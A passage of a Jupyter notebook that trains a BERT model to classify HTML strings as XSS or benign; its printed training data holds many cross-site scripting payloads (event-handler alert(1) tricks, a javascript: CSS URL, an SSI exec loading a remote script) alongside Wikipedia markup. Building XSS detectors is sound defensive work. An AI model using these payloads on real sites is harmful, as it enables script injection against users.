title=\"Edit section: Devaluation of humanity\">edit </a><span class=\"mw-editsection-bracket\">] ',\n '<dt><a class=\"reference internal\" href=\"topics/telnetconsole.html\"><span class=\"doc\">Telnet Console',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> Later published as<br /><cite class=\"citation book\">Solomonoff, Ray (1957). \"An Inductive Inference Machine\". <i>IRE Convention Record </i>. Section on Information Theory, part 2. pp.&#160;56–62. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=An+Inductive+Inference+Machine&amp;rft.btitle=IRE+Convention+Record&amp;rft.pages=56-62&amp;rft.date=1957&amp;rft.aulast=Solomonoff&amp;rft.aufirst=Ray&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n '\\t </span>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=ACM+Computing+Classification+System%3A+Artificial+intelligence&amp;rft.pub=ACM&amp;rft.date=1998&amp;rft_id=http%3A%2F%2Fwww.acm.org%2Fclass%2F1998%2FI.2.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<style>@keyframes x{}</style><em style=\"animation-name:x\" onanimationstart=\"alert(1)\"></em>',\n ' </p><p><a href=\"/wiki/Isaac_Asimov\" title=\"Isaac Asimov\">Isaac Asimov </a> introduced the <a href=\"/wiki/Three_Laws_of_Robotics\" title=\"Three Laws of Robotics\">Three Laws of Robotics </a> in many books and stories, most notably the \"Multivac\" series about a super-intelligent computer of the same name. Asimov\\'s laws are often brought up during lay discussions of machine ethics;<sup id=\"cite_ref-415\" class=\"reference\"><a href=\"#cite_note-415\">&#91;403&#93; </a> </sup> while almost all artificial intelligence researchers are familiar with Asimov\\'s laws through popular culture, they generally consider the laws useless for many reasons, one of which is their ambiguity.<sup id=\"cite_ref-416\" class=\"reference\"><a href=\"#cite_note-416\">&#91;404&#93; </a> </sup>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n '\\t </span> </li>',\n '<style>@keyframes x{}</style><form style=\"animation-name:x\" onanimationend=\"alert(1)\"></form>',\n '<ul onbeforecut=\"alert(1)\" contenteditable>test</ul>',\n '<embed onclick=\"alert(1)\">test</embed>',\n '<map id=x tabindex=1 onfocus=alert(1)></map>',\n '<ul><li><a href=\"/wiki/Unmanned_aerial_vehicle\" title=\"Unmanned aerial vehicle\">aerial </a> </li>',\n '<acronym draggable=\"true\" ondragenter=\"alert(1)\">test</acronym>',\n '\\t </span> </a> </li>',\n '<STYLE>li {list-style-image: url(\"javascript:alert(\\'\\')\");}</STYLE><UL><LI></br>',\n '<li id=x tabindex=1 onbeforeactivate=alert(1)></li>',\n '<object onpointerout=alert(1)>XSS</object>',\n '<input3 onpointerleave=alert(1)>XSS</input3>',\n '<html onkeydown=\"alert(1)\" contenteditable>test</html>',\n '<image3 onpointerenter=alert(1)>XSS</image3>',\n '<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>',\n '<caption onmouseup=\"alert(1)\">test</caption>',\n '<nextid onbeforecut=\"alert(1)\" contenteditable>test</nextid>',\n '<style>@keyframes slidein {}</style><tfoot style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></tfoot>',\n '<spacer id=x tabindex=1 onactivate=alert(1)></spacer>',\n '<div draggable=\"true\" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>',\n '<li><a href=\"/wiki/Statistics\" title=\"Statistics\">Statistics </a> </li>',\n '<li><a href=\"/wiki/Digital_marketing\" title=\"Digital marketing\">Digital marketing </a> </li>',\n '<col onmousedown=\"alert(1)\">test</col>',\n '\\t </span>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=airesearch.com&amp;rft.atitle=Deep+Neural+Networks+for+Acoustic+Modeling+in+Speech+Recognition&amp;rft.date=2015-10-23&amp;rft.aulast=Research&amp;rft.aufirst=AI&amp;rft_id=http%3A%2F%2Fairesearch.com%2Fai-research-papers%2Fdeep-neural-networks-for-acoustic-modeling-in-speech-recognition%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<code onkeydown=\"alert(1)\" contenteditable>test</code>',\n '<li><a href=\"/wiki/Imre_Lakatos\" title=\"Imre Lakatos\">Imre Lakatos </a> </li>',\n '<li><cite id=\"CITEREFNeedham1986\" class=\"citation book\"><a href=\"/wiki/Joseph_Needham\" title=\"Joseph Needham\">Needham, Joseph </a> (1986). <a href=\"/wiki/Science_and_Civilization_in_China\" class=\"mw-redirect\" title=\"Science and Civilization in China\"><i>Science and Civilization in China: Volume 2 </i> </a>. Caves Books Ltd. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Science+and+Civilization+in+China%3A+Volume+2&amp;rft.pub=Caves+Books+Ltd.&amp;rft.date=1986&amp;rft.aulast=Needham&amp;rft.aufirst=Joseph&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<track onpointerenter=alert(1)>XSS</track>',\n '<style>@keyframes slidein {}</style><html style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></html>',\n '<legend onpointerup=alert(1)>XSS</legend>',\n '<!--#exec cmd=\"/bin/echo \\'<SCR\\'\"--><!--#exec cmd=\"/bin/echo \\'IPT SRC=http://.rocks/.js></SCRIPT>\\'\"',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation news\">Buckley, Chris; Mozur, Paul (22 May 2019). <a rel=\"nofollow\" class=\"external text\" href=\"https://www.nytimes.com/2019/05/22/world/asia/china-surveillance-xinjiang.html\">\"How China Uses High-Tech Surveillance to Subdue Minorities\" </a>. <i>The New York Times </i>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+York+Times&amp;rft.atitle=How+China+Uses+High-Tech+Surveillance+to+Subdue+Minorities&amp;rft.date=2019-05-22&amp;rft.aulast=Buckley&amp;rft.aufirst=Chris&amp;rft.au=Mozur%2C+Paul&amp;rft_id=https%3A%2F%2Fwww.nytimes.com%2F2019%2F05%2F22%2Fworld%2Fasia%2Fchina-surveillance-xinjiang.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '\\t </span> <span class=\"toctext\">Search and optimization ',\n '<nobr onpointerdown=alert(1)>XSS</nobr>',\n '<div draggable=\"true\" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>',\n '<link onmouseover=\"alert(1)\">test</link>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\">Mathematics<br />of computing </th><td class=\"navbox-list navbox-odd\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n '<li><a href=\"/wiki/Panpsychism\" title=\"Panpsychism\">Panpsychism </a> </li>',\n ' </p><p>Simple exhaustive searches<sup id=\"cite_ref-Uninformed_search_188-0\" class=\"reference\"><a href=\"#cite_note-Uninformed_search-188\">&#91;184&#93; </a> </sup> are rarely sufficient for most real-world problems: the <a href=\"/wiki/Search_algorithm\" title=\"Search algorithm\">search space </a> (the number of places to search) quickly grows to <a href=\"/wiki/Astronomically_large\" class=\"mw-redirect\" title=\"Astronomically large\">astronomical numbers </a>. The result is a search that is <a href=\"/wiki/Computation_time\" class=\"mw-redirect\" title=\"Computation time\">too slow </a> or never completes. The solution, for many problems, is to use \"<a href=\"/wiki/Heuristics\" class=\"mw-redirect\" title=\"Heuristics\">heuristics </a>\" or \"rules of thumb\" that prioritize choices in favor of those that are more likely to reach a goal and to do so in a shorter number of steps. In some search methodologies heuristics can also serve to entirely eliminate some choices that are unlikely to lead to a goal (called \"<a href=\"/wiki/Pruning_(algorithm)\" class=\"mw-redirect\" title=\"Pruning (algorithm)\">pruning </a> the <a href=\"/wiki/Search_tree\" title=\"Search tree\">search tree </a>\"). <a href=\"/wiki/Heuristics\" class=\"mw-redirect\" title=\"Heuristics\">Heuristics </a> supply the program with a \"best guess\" for the path on which the solution lies.<sup id=\"cite_ref-Informed_search_189-0\" class=\"reference\"><a href=\"#cite_note-Informed_search-189\">&#91;185&#93; </a> </sup> Heuristics limit the search for solutions into a smaller sample size.<sup id=\"cite_ref-FOOTNOTETecuci2012_130-1\" class=\"reference\"><a href=\"#cite_note-FOOTNOTETecuci2012-130\">&#91;127&#93; </a> </sup>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation journal\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.wired.com/2017/05/win-china-alphagos-designers-explore-new-ai/\">\"After Win in China, AlphaGo\\'s Designers Explore New AI\" </a>. <i>Wired </i>. 27 May 2017. <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20170602234726/https://www.wired.com/2017/05/win-china-alphagos-designers-explore-new-ai/\">Archived </a> from the original on 2 June 2017. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired&amp;rft.atitle=After+Win+in+China%2C+AlphaGo%27s+Designers+Explore+New+AI&amp;rft.date=2017-05-27&amp;rft_id=https%3A%2F%2Fwww.wired.com%2F2017%2F05%2Fwin-china-alphagos-designers-explore-new-ai%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<base onmousemove=\"alert(1)\">test</base>',\n '\\t </span></a></dt><dd>Customize the input and output of your spiders.</dd>',\n '<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>',\n '<div role=\"note\" class=\"hatnote navigation-not-searchable\">Main articles: <a href=\"/wiki/Artificial_general_intelligence\" title=\"Artificial general intelligence\">Artificial general intelligence </a> and <a href=\"/wiki/AI-complete\" title=\"AI-complete\">AI-complete </a> </div>',\n '<bdo oncopy=\"alert(1)\" contenteditable>test</bdo>',\n '<style>@keyframes slidein {}</style><sub style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></sub>',\n '<ul><li><a href=\"/wiki/Network_architecture\" title=\"Network architecture\">Network architecture </a> </li>',\n '<dl class=\"docutils\">',\n '\\t </span> <span class=\"reference-text\">The most dramatic case of sub-symbolic AI being pushed into the background was the devastating critique of <a href=\"/wiki/Perceptron\" title=\"Perceptron\">perceptrons </a> by <a href=\"/wiki/Marvin_Minsky\" title=\"Marvin Minsky\">Marvin Minsky </a> and <a href=\"/wiki/Seymour_Papert\" title=\"Seymour Papert\">Seymour Papert </a> in 1969. See <a href=\"/wiki/History_of_AI\" class=\"mw-redirect\" title=\"History of AI\">History of AI </a>, <a href=\"/wiki/AI_winter\" title=\"AI winter\">AI winter </a>, or <a href=\"/wiki/Frank_Rosenblatt\" title=\"Frank Rosenblatt\">Frank Rosenblatt </a>. ',\n '<input2 onpointerout=alert(1)>XSS</input2>',\n '\\t </span>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=WIRED&amp;rft.atitle=World%27s+First+Self-Driving+Semi-Truck+Hits+the+Road&amp;rft.date=2015-05-05&amp;rft.aulast=Davies&amp;rft.aufirst=Alex&amp;rft_id=https%3A%2F%2Fwww.wired.com%2F2015%2F05%2Fworlds-first-self-driving-semi-truck-hits-road%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation journal\">Kaplan, Andreas; Haenlein, Michael (1 January 2019). \"Siri, Siri, in my hand: Who\\'s the fairest in the land? On the interpretations, illustrations, and implications of artificial intelligence\". <i>Business Horizons </i>. <b>62 </b> (1): 15–25. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1016%2Fj.bushor.2018.08.004\">10.1016/j.bushor.2018.08.004 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Business+Horizons&amp;rft.atitle=Siri%2C+Siri%2C+in+my+hand%3A+Who%27s+the+fairest+in+the+land%3F+On+the+interpretations%2C+illustrations%2C+and+implications+of+artificial+intelligence&amp;rft.volume=62&amp;rft.issue=1&amp;rft.pages=15-25&amp;rft.date=2019-01-01&amp;rft_id=info%3Adoi%2F10.1016%2Fj.bushor.2018.08.004&amp;rft.aulast=Kaplan&amp;rft.aufirst=Andreas&amp;rft.au=Haenlein%2C+Michael&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<li><a href=\"/wiki/Pierre_Duhem\" title=\"Pierre Duhem\">Pierre Duhem </a> </li>',\n '<iframe draggable=\"true\" ondragstart=\"alert(1)\">test</iframe>',\n ' </li>',\n '<menuitem oncopy=\"alert(1)\" contenteditable>test</menuitem>',\n '<frameset><frame id=x onfocus=alert(1)>',\n '<animate onpointerout=alert(1)>XSS</animate>',\n '<frame onpointerleave=alert(1)>XSS</frame>',\n '<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>',\n '<menu onmouseup=\"alert(1)\">test</menu>',\n '<multicol onclick=\"alert(1)\">test</multicol>',\n '\\t </span> 2015 ',\n '<li id=\"cite_note-4\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-4\">^ </a> </b> ',\n 'This list of intelligent traits is based on the topics covered by the major AI textbooks, including:',\n '<li><a href=\"/wiki/Software_repository\" title=\"Software repository\">Software repository </a> </li> </ul>',\n '<picture oncopy=\"alert(1)\" contenteditable>test</picture>',\n '<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>',\n '<picture id=x tabindex=1 onactivate=alert(1)></picture>',\n '<plaintext onmouseout=\"alert(1)\">test</plaintext>',\n ' ',\n '</div>',\n '<sup onmouseout=\"alert(1)\">test</sup>',\n '<content oncut=\"alert(1)\" contenteditable>test</content>',\n '<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>',\n '<style>@keyframes x{}</style><mark style=\"animation-name:x\" onanimationend=\"alert(1)\"></mark>',\n '<div role=\"search\">',\n '<basefont oncut=\"alert(1)\" contenteditable>test</basefont>',\n '           <div itemprop=\"articleBody\">     ',\n '<dir onpointermove=alert(1)>XSS</dir>',\n '<div draggable=\"true\" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>',\n '<li><a href=\"/wiki/Mathematical_optimization\" title=\"Mathematical optimization\">Search methodology </a> </li>',\n '<dfn onpointermove=alert(1)>XSS</dfn>',\n '<li><a href=\"/wiki/Social_software\" title=\"Social software\">Social information systems </a> </li>',\n '<li><a href=\"/wiki/Andrew_Yang\" title=\"Andrew Yang\">Andrew Yang </a> </li>',\n '<style>@keyframes x{}</style><select style=\"animation-name:x\" onanimationend=\"alert(1)\"></select>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation web\"><a rel=\"nofollow\" class=\"external text\" href=\"http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/\">\"The case against killer robots, from a guy actually working on artificial intelligence\" </a>. <i>Fusion.net </i>. <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20160204175716/http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/\">Archived </a> from the original on 4 February 2016<span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">31 January ',\n ' </li>',\n '<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>',\n '\\t </span>',\n '<audio onbeforepaste=\"alert(1)\" contenteditable>test</audio>',\n '<div id=\"p-personal\" role=\"navigation\" class=\"\" aria-labelledby=\"p-personal-label\">',\n '<frameset onpaste=\"alert(1)\" contenteditable>test</frameset>',\n '<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>',\n '<li id=\"cite_note-260\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-260\">^ </a> </b> ',\n '\\t </span>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cell&amp;rft.atitle=Identifying+Medical+Diagnoses+and+Treatable+Diseases+by+Image-Based+Deep+Learning&amp;rft.volume=172&amp;rft.issue=5&amp;rft.pages=1122-1131.e9&amp;rft.date=2018&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cell.2018.02.010&amp;rft_id=info%3Apmid%2F29474911&amp;rft.aulast=Kermany&amp;rft.aufirst=D&amp;rft.au=Goldbaum%2C+M&amp;rft.au=Zhang%2C+Kang&amp;rft_id=https%3A%2F%2Fwww.cell.com%2Faction%2FcaptchaChallenge%3FredirectUri%3D%252Fcell%252Fpdf%252FS0092-8674%252818%252930154-5.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n ...]"
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data = list(df['Sentence'])\n",
    "label = list(df['Label'])\n",
    "data"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:08.556439400Z",
     "start_time": "2024-05-30T14:30:08.519440900Z"
    }
   },
   "id": "f6cad472d3874ecd"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "!pip install transformers"
   ],
   "metadata": {
    "collapsed": false
   },
   "id": "5b3eb52d18039ff3"
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "outputs": [],
   "source": [
    "from torch.utils.data import Dataset\n",
    "class XSSDataset(Dataset):\n",
    "    def __init__(self, texts, labels, tokenizer, max_len):\n",
    "        self.texts = texts\n",
    "        self.labels = labels\n",
    "        self.tokenizer = tokenizer\n",
    "        self.max_len = max_len\n",
    "\n",
    "    def __len__(self):\n",
    "        return len(self.texts)\n",
    "\n",
    "    def __getitem__(self, idx):\n",
    "        text = self.texts[idx]\n",
    "        label = self.labels[idx]\n",
    "\n",
    "        encoding = self.tokenizer.encode_plus(\n",
    "            text,\n",
    "            add_special_tokens=True,\n",
    "            max_length=self.max_len,\n",
    "            return_token_type_ids=False,\n",
    "            padding='max_length',  # 데이터셋 생성 시에만 max_length에 맞춰 패딩\n",
    "            truncation=True,\n",
    "            return_attention_mask=True,\n",
    "            return_tensors='pt',\n",
    "        )\n",
    "\n",
    "        return {\n",
    "            'input_ids': encoding['input_ids'].squeeze(),  # .squeeze()로 불필요한 차원 제거\n",
    "            'attention_mask': encoding['attention_mask'].squeeze(),\n",
    "            'label': torch.tensor(label, dtype=torch.long)\n",
    "        }\n"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:11.379026100Z",
     "start_time": "2024-05-30T14:30:11.345352200Z"
    }
   },
   "id": "714152a9507a6a51"
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "outputs": [
    {
     "data": {
      "text/plain": "(10948, 2738)"
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from transformers import BertTokenizer, BertForSequenceClassification\n",
    "from sklearn.model_selection import train_test_split\n",
    "MAX_LEN = 128\n",
    "BATCH_SIZE = 64\n",
    "EPOCHS = 3\n",
    "PRE_TRAINED_MODEL_NAME = 'bert-base-uncased'\n",
    "\n",
    "train_text  , test_text , train_label , test_label = train_test_split(data,label,test_size=0.2)\n",
    "len(train_text)  , len(test_text)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:14.218068900Z",
     "start_time": "2024-05-30T14:30:12.276161Z"
    }
   },
   "id": "9ca44fd683594727"
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "outputs": [],
   "source": [
    "tokenizer = BertTokenizer.from_pretrained(PRE_TRAINED_MODEL_NAME)\n",
    "train_dataset = XSSDataset(train_text, train_label, tokenizer, MAX_LEN)\n",
    "test_dataset = XSSDataset(test_text , test_label ,tokenizer,MAX_LEN)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:14.658699200Z",
     "start_time": "2024-05-30T14:30:14.224227500Z"
    }
   },
   "id": "fdfbdc2ac8f3ff92"
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "outputs": [
    {
     "data": {
      "text/plain": "{'input_ids': tensor([  101,  1026,  4998,  8909,  1027,  1060, 21628, 22254, 10288,  1027,\n          1015,  2006, 18908, 21466,  1027,  9499,  1006,  1015,  1007,  1028,\n          1026,  1013,  4998,  1028,   102,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0,     0,     0,\n             0,     0,     0,     0,     0,     0,     0,     0]),\n 'attention_mask': tensor([1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n         1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n         0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n         0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n         0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n         0, 0, 0, 0, 0, 0, 0, 0]),\n 'label': tensor(1)}"
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test = train_dataset.__getitem__(0)\n",
    "test\n",
    "# test['text'],test['attention_mask'].shape,test['input_ids'].shape,test['label'].shape"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-26T15:00:37.953807300Z",
     "start_time": "2024-05-26T15:00:37.937869600Z"
    }
   },
   "id": "f8ced5e382d956a6"
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "outputs": [],
   "source": [
    "from torch.utils.data import DataLoader\n",
    "from transformers import DataCollatorWithPadding\n",
    "data_collator = DataCollatorWithPadding(tokenizer=tokenizer)\n",
    "train_DataLoader = DataLoader(train_dataset,batch_size=BATCH_SIZE,shuffle=True,collate_fn=data_collator)\n",
    "test_DataLoader = DataLoader(test_dataset , batch_size=BATCH_SIZE ,shuffle=False, collate_fn=data_collator)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:20.068628300Z",
     "start_time": "2024-05-30T14:30:16.376455400Z"
    }
   },
   "id": "acbc1fe538393d6a"
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'input_ids': tensor([[  101,  1026, 26718,  ...,     0,     0,     0],\n",
      "        [  101,  1026, 16839,  ...,     0,     0,     0],\n",
      "        [  101,  1026, 17917,  ...,     0,     0,     0],\n",
      "        ...,\n",
      "        [  101,  1026,  2686,  ...,     0,     0,     0],\n",
      "        [  101,  1026,  1038,  ...,     0,     0,     0],\n",
      "        [  101,  1026,  5896,  ...,     0,     0,     0]]), 'attention_mask': tensor([[1, 1, 1,  ..., 0, 0, 0],\n",
      "        [1, 1, 1,  ..., 0, 0, 0],\n",
      "        [1, 1, 1,  ..., 0, 0, 0],\n",
      "        ...,\n",
      "        [1, 1, 1,  ..., 0, 0, 0],\n",
      "        [1, 1, 1,  ..., 0, 0, 0],\n",
      "        [1, 1, 1,  ..., 0, 0, 0]]), 'labels': tensor([0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1,\n",
      "        1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0,\n",
      "        0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1])}\n",
      "torch.Size([64, 128])\n",
      "torch.Size([64, 128])\n",
      "torch.Size([64])\n"
     ]
    }
   ],
   "source": [
    "for batch in test_DataLoader:\n",
    "    print(batch)\n",
    "    print(batch['input_ids'].shape)\n",
    "    print(batch['attention_mask'].shape)\n",
    "    print(batch['labels'].shape)\n",
    "    break"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-26T15:09:46.591525200Z",
     "start_time": "2024-05-26T15:09:46.540824300Z"
    }
   },
   "id": "e7f845983038e049"
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'input_ids': tensor([[  101,  1026,  2806,  ...,     0,     0,     0],\n",
      "        [  101,  1026,  1013,  ...,  6185,  1011,   102],\n",
      "        [  101,  1026, 12373,  ...,     0,     0,     0],\n",
      "        ...,\n",
      "        [  101,  1026,  5622,  ...,     0,     0,     0],\n",
      "        [  101,  1026,  1013,  ...,     0,     0,     0],\n",
      "        [  101,  1026, 13764,  ...,     0,     0,     0]]), 'attention_mask': tensor([[1, 1, 1,  ..., 0, 0, 0],\n",
      "        [1, 1, 1,  ..., 1, 1, 1],\n",
      "        [1, 1, 1,  ..., 0, 0, 0],\n",
      "        ...,\n",
      "        [1, 1, 1,  ..., 0, 0, 0],\n",
      "        [1, 1, 1,  ..., 0, 0, 0],\n",
      "        [1, 1, 1,  ..., 0, 0, 0]]), 'labels': tensor([1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0,\n",
      "        0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1,\n",
      "        0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1])}\n",
      "torch.Size([64, 128])\n",
      "torch.Size([64, 128])\n",
      "torch.Size([64])\n"
     ]
    }
   ],
   "source": [
    "for batch in train_DataLoader:\n",
    "    print(batch)\n",
    "    print(batch['input_ids'].shape)\n",
    "    print(batch['attention_mask'].shape)\n",
    "    print(batch['labels'].shape)\n",
    "    break"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-26T15:00:43.260878100Z",
     "start_time": "2024-05-26T15:00:43.211164Z"
    }
   },
   "id": "13beb7ee855504ac"
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Some weights of BertForSequenceClassification were not initialized from the model checkpoint at bert-base-uncased and are newly initialized: ['classifier.bias', 'classifier.weight']\n",
      "You should probably TRAIN this model on a down-stream task to be able to use it for predictions and inference.\n"
     ]
    }
   ],
   "source": [
    "model = BertForSequenceClassification.from_pretrained(PRE_TRAINED_MODEL_NAME, num_labels=2)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:21.122190100Z",
     "start_time": "2024-05-30T14:30:20.071275300Z"
    }
   },
   "id": "e3043f59a22c284f"
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "outputs": [
    {
     "data": {
